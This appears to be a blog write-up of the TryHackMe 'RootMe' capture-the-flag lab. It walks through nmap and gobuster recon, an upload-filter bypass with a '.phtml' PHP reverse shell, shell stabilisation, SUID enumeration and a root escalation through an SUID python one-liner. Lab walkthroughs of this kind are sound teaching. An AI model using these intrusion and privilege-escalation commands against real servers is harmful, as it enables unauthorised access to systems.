---
layout: post
---

Hi all

This CTF is about web hacking, where it’s possible to upload a local file to get the reverse shell and use some Linux knowledge to escalate the privilege.
To avoid this type of situation, the System Administrator and the Programmer should not allow the upload of malicious file (.e.g. php, phtml, etc), and also, in the Linux server, the System Administrator should take care to not left some misconfigured binaries/files in the server, since there are some files that can be used for privilege escalation (e.g. /usr/bin/python).

To get started with it, the first thing to do is perform a recon in the target, such as below:

```
[john@linux rootme]$ nmap -sV -A 10.10.42.50
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-07 08:30 -03
Nmap scan report for 10.10.42.50
Host is up (0.26s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4ab9160884c25448ba5cfd3f225f2214 (RSA)
|   256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA)
|_  256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.72 seconds
With this, it’s possible to see that are 2 TCP ports open, the port 22 (running ssh) and the port 80 (running Apache 2.4.29).
```

If the server is running a web server (Apache), it’s possible to perform a content discovery on it (with tools like gobuster, dirbuster, etc), like below:

```
[john@linux rootme]$ gobuster dir -w /opt/wordlists/Discovery/Web-Content/common.txt -u 10.10.42.50
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.42.50
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/wordlists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/03/07 08:34:30 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 276]
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 308] [--> http://10.10.42.50/css/]
/index.php            (Status: 200) [Size: 616]
/js                   (Status: 301) [Size: 307] [--> http://10.10.42.50/js/]
/panel                (Status: 301) [Size: 310] [--> http://10.10.42.50/panel/]
/server-status        (Status: 403) [Size: 276]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.42.50/uploads/]
Progress: 4708 / 4714 (99.87%)
===============================================================
2023/03/07 08:36:23 Finished
===============================================================
```

It’s possible to see that it returned two interesting directories, the /panel and the /uploads. And also, it’s remarkable that the server is using php (check it on “/index.php” file).
If it’s allowed to upload a file, it’s valid to try to upload a reverse shell. But for this, it’s needed to know which file extension is allowed to upload.

Using the Sniper attack on BurpSuite with a simple wordlist of some .php exentions type, it’s easy to discover that the extension “.phtml” is acceptable by the server.


Now, it’s needed to upload a PHP reverse shell — it’s easy to find one in the internet.
Note: the file must end with the “.phtml” extension.

After uploading the file and “listening” the connection in the same port configured in the reverse shell, it’s just needed to “access” the file by accessing the link “http://10.10.42.50/uploads/php-reverse-shell.phtml".


The “1234” is the -p flag, which must be the same at the flag set inside the php reverse shell
The next step is to escalate the privileges and get root, but the TryHackMe Task 3 asks the user.txt flag, which can be found by searching for the user.txt file with the following command:

```find / -type f -name user.txt```

But to run this, it’s needed to be at a shell, not a tty.
And to get the shell, this following command can be used in this case:

```python -c ‘import pty;pty.spawn(“/bin/bash”)’```

It will spawn a stable shell to work on.

After getting the stable shell, it’s time to escalate the privileges to root. There are a lot of methods to make it.
On this CTF, let’s search for all SUIDs files in the server with:

```find / -user root -perm -4000 -exec ls -ldb {} \;```

It will be a huge output, but after analyzing it, it’s remarkable some files, such as:

```shell
-rwsr-sr-x 1 root root 3665768 Aug  4  2020 /usr/bin/python
-rwsr-xr-x 1 root root 149080 Jan 31  2020 /usr/bin/sudo
-rwsr-xr-x 1 root root 59640 Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root root 44664 Mar 22  2019 /bin/su
```

The python binary can be used to escalate the privileges (more info at: https://gtfobins.github.io/).

Now, with that in mind, it’s known that it’s possible to execute python as root, since SUID is set on this binary. And to make this, it’s just need to run this command:

```shell
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

As the user now is the root user, it’s possible to grab the root.txt flag at /root/root.txt.
Reminder: It’s possible to search a file with the find command:

```shell
find / -type f -name <file>
```

Thanks everyone for the attention, I appreciate it.
I hope that it has been useful and help you in something.